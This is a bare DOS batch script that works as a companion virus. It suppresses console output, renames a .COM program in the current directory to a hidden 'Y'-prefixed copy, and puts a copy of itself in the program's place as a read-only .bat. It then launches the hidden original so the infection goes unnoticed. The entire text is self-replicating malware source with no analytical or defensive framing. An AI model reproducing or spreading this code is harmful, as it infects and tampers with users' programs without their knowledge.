@ctty nul
for %%f in (*.com) do set K=%%f
if %K%==COMMAND.COM set K=
rename %K% Y%K%
if not exist Y%K% goto end
attrib +h Y%K%
copy %0.bat %K%
attrib +r %K%
ren %K% *.bat
set K=
:end
@if exist Y%0.com Y%0.com %1 %2 %3
@if exist Y%0.exe Y%0.exe %1 %2 %3

